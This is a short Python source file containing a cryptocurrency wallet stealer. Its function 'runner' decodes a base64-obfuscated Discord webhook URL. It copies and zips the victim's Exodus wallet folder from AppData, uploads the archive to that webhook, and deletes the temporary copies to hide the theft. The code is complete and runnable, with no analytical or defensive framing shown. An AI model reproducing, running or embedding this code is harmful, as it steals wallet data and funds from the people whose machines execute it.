import os.path, shutil, requests
import base64

def runner():
    user = os.path.expanduser("~")

    hook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mzc3MDMwODgzNTYxNDc5MS9GSHlTMjVrNWU3dllnY05lSExmcmNpVHNNNTFqZHYzMk5GcXRUc2J5eTBQaVhwQTNiaTNudFUxY2JQd1dUQTNjR1k1Uw==").decode()
    if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
     shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
     shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

     file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
     r = requests.post(hook, files=file)
     try:
      os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
      os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
     except:
       pass
